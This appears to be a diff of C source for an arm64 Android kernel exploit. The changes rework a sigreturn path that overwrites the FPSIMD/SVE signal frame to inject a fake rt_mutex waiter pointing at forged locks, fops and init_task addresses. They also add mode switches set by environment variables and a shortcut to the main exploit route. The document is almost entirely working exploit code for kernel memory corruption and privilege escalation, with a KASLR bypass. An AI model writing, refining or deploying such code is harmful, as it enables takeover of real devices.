@@ -19,28 +19,101 @@ atomic_int pipe_prepare_done;
 int memfd_leak;
 
 
-/* === SIGRETURN FPSIMD PANIC REPRO === */
+/* === SIGRETURN FPSIMD ISOLATED TEST === */
 #include <signal.h>
+#include <stddef.h>
 #include <asm/sigcontext.h>
+
+#define SIGRETURN_MODE_SAFE   0
+#define SIGRETURN_MODE_GHOST  1
+#define SIGRETURN_MODE_FULL   2
 
 static volatile int sigreturn_done = 0;
 static unsigned char g_fake_waiter[0x58];
+static int sigreturn_mode = SIGRETURN_MODE_FULL;
+
+static int sigreturn_found_fpsimd = 0;
+static int sigreturn_found_sve = 0;
+static uintptr_t sigreturn_target_addr = 0;
 
 static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
 {
     (void)sig; (void)info;
     ucontext_t *uc = (ucontext_t *)ucontext;
-    mcontext_t *mc = &uc->uc_mcontext;
-    unsigned char *base = (unsigned char *)mc;
+    struct sigcontext *sc = (struct sigcontext *)&uc->uc_mcontext;
 
-    for (int off = 0; off < 1024; off += 8) {
-        if (*(uint32_t *)(base + off) == FPSIMD_MAGIC) {
+    /* __reserved starts at offset 0x120 from sigcontext start
+       (fault_address 8 + regs[31] 248 + sp 8 + pc 8 + pstate 8 + pad 8 = 288) */
+    unsigned char *base = (unsigned char *)sc + offsetof(struct sigcontext, __reserved);
+
+    sigreturn_found_fpsimd = 0;
+    sigreturn_found_sve = 0;
+    sigreturn_target_addr = 0;
+
+    for (int off = 0; off < 4096; ) {
+        uint32_t magic = *(uint32_t *)(base + off);
+        uint32_t size  = *(uint32_t *)(base + off + 4);
+
+        if (magic == 0 && size == 0)
+            break;
+        if (magic == 0) {
+            off += 8;
+            continue;
+        }
+
+        if (magic == FPSIMD_MAGIC) {
+            sigreturn_found_fpsimd = 1;
             struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
-            uint8_t *vregs = (uint8_t *)&fpsimd->vregs[0];
-            memcpy(vregs + 0x18, g_fake_waiter, 0x58);
+            uintptr_t vregs = (uintptr_t)&fpsimd->vregs[0];
+
+            /* Peek next record for SVE */
+            int next_off = off + size;
+            if (next_off + 8 <= 4096) {
+                uint32_t next_magic = *(uint32_t *)(base + next_off);
+                if (next_magic == SVE_MAGIC)
+                    sigreturn_found_sve = 1;
+            }
+
+            int waiter_off = sigreturn_found_sve ? 0x28 : 0x18;
+            sigreturn_target_addr = vregs + waiter_off;
+
+            pr_info("sigreturn ctx fpsimd=%d sve=%d vregs=%016zx waiter_off=+%02x target=%016zx mode=%d\n",
+                    sigreturn_found_fpsimd, sigreturn_found_sve,
+                    vregs, waiter_off, sigreturn_target_addr, sigreturn_mode);
+
+            if (sigreturn_mode == SIGRETURN_MODE_SAFE) {
+                sigreturn_done = 1;
+                return;
+            }
+
+            uint8_t *dst = (uint8_t *)sigreturn_target_addr;
+
+            if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
+                /* Controlled panic test: zero out waiter->lock */
+                uint64_t controlled[10];
+                memset(controlled, 0, sizeof(controlled));
+                controlled[6] = 0;  /* waiter->lock at offset +0x38 = vregs + 0x50 */
+                memcpy(dst, controlled, sizeof(controlled));
+            }
+
             sigreturn_done = 1;
             return;
         }
+
+        if (size == 0)
+            break;
+        off += size;
+    }
+
+    /* Diagnostic hex-dump if not found */
+    pr_error("sigreturn handler: FPSIMD not found, hex-dump first 64 bytes of __reserved:\n");
+    for (int i = 0; i < 64; i += 16) {
+        pr_error("  %04x: %02x %02x %02x %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                 i,
+                 base[i+0], base[i+1], base[i+2], base[i+3],
+                 base[i+4], base[i+5], base[i+6], base[i+7],
+                 base[i+8], base[i+9], base[i+10], base[i+11],
+                 base[i+12], base[i+13], base[i+14], base[i+15]);
     }
 }
 
@@ -52,28 +125,39 @@ static uint64_t pselect_write_target(void) { return 0; }
 
 void do_sigreturn_fake_lock_route(void)
 {
-    if (!page_base || !fake_lock || !fake_fops) {
-        pr_error("sigreturn route missing page=%016zx lock=%016zx fops=%016zx\n",
-                 page_base, fake_lock, fake_fops);
-        return;
+    const char *mode_env = getenv("SIGRETURN_MODE");
+    if (mode_env && strcmp(mode_env, "safe") == 0) {
+        sigreturn_mode = SIGRETURN_MODE_SAFE;
+    } else if (mode_env && strcmp(mode_env, "ghost") == 0) {
+        sigreturn_mode = SIGRETURN_MODE_GHOST;
+    } else {
+        sigreturn_mode = SIGRETURN_MODE_FULL;
     }
 
-    memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
-
-    put_fake_waiter(g_fake_waiter, 0,
-                    1, 0, 0,                       /* tree: black root, no children */
-                    fake_fops,                     /* pi_parent */
-                    data_addr(ASHMEM_MISC_FOPS),   /* pi_right */
-                    0,                             /* pi_left */
-                    text_addr(INIT_TASK),          /* task */
-                    fake_lock,                     /* lock */
-                    FAKE_WAITER_PRIO);             /* prio */
+    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
+        if (!page_base || !fake_lock || !fake_fops) {
+            pr_error("sigreturn full mode missing page=%016zx lock=%016zx fops=%016zx\n",
+                     page_base, fake_lock, fake_fops);
+            return;
+        }
+        memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
+        put_fake_waiter(g_fake_waiter, 0,
+                        1, 0, 0,
+                        fake_fops,
+                        data_addr(ASHMEM_MISC_FOPS),
+                        0,
+                        text_addr(INIT_TASK),
+                        fake_lock,
+                        FAKE_WAITER_PRIO);
+    } else {
+        pr_info("sigreturn isolated test mode=%s\n",
+                sigreturn_mode == SIGRETURN_MODE_SAFE ? "safe" : "ghost");
+    }
 
     struct sigaction sa = {0};
     sa.sa_sigaction = sigreturn_handler;
     sa.sa_flags = SA_SIGINFO | SA_RESTART;
     sigaction(SIGUSR1, &sa, NULL);
-
 
     usleep(50000);
 
@@ -89,23 +173,42 @@ void do_sigreturn_fake_lock_route(void)
     while (!sigreturn_done)
         sched_yield();
 
-    atomic_store(&punch_consume_go, 1);
-
-    int waited = 0;
-    while (waited < 500000) {
-        int c = atomic_load(&consumer_calls);
-        int s = atomic_load(&consumer_success);
-        if (c > 0 && s > 0)
-            break;
-        if (cfi_dirty_seen)
-            break;
-        usleep(1000);
-        waited += 1000;
+    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
+        atomic_store(&punch_consume_go, 1);
+        int waited = 0;
+        while (waited < 500000) {
+            int c = atomic_load(&consumer_calls);
+            int s = atomic_load(&consumer_success);
+            if (c > 0 && s > 0)
+                break;
+            if (cfi_dirty_seen)
+                break;
+            usleep(1000);
+            waited += 1000;
+        }
+        atomic_store(&punch_consume_go, 0);
+        pr_info("sigreturn full mode done calls=%d success=%d\n",
+                atomic_load(&consumer_calls), atomic_load(&consumer_success));
+    } else if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
+        /* Trigger rt_mutex_adjust_prio_chain to read corrupted waiter->lock */
+        atomic_store(&punch_consume_go, 1);
+        int waited = 0;
+        while (waited < 200000) {
+            if (cfi_dirty_seen) break;
+            usleep(1000);
+            waited += 1000;
+        }
+        atomic_store(&punch_consume_go, 0);
+        pr_info("sigreturn ghost mode done\n");
+        // Если нужна информация о fpsimd/sve/target – добавьте её сюда
+        pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
+                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
+    } 
+    else { // SAFE режим
+        usleep(100000);
+        pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
+                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
     }
-
-    atomic_store(&punch_consume_go, 0);
-    pr_info("sigreturn route done calls=%d success=%d\n",
-            atomic_load(&consumer_calls), atomic_load(&consumer_success));
 }
 /* === END SIGRETURN REPRO === */
 
@@ -517,6 +620,16 @@ int run_exploit(int argc, char **argv) {
                kaslr_base, kaslr_slide, slide_p0_offset);
     return 0;
   }
+  
+  /* === SIGRETURN ISOLATION BYPASS === */
+  if (getenv("SIGRETURN_ONLY")) {
+    pr_info("SIGRETURN_ONLY: bypassing P0/fops path, going directly to main route\n");
+    run_main_route_threads();
+    pr_success("sigreturn-only test done pid=%d\n", getpid());
+    return 0;
+  }
+  /* === END SIGRETURN BYPASS === */
+
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   if (!slide_p0_session_fresh) {
     pr_error("full route requires P0 discovery in the current exploit process; "
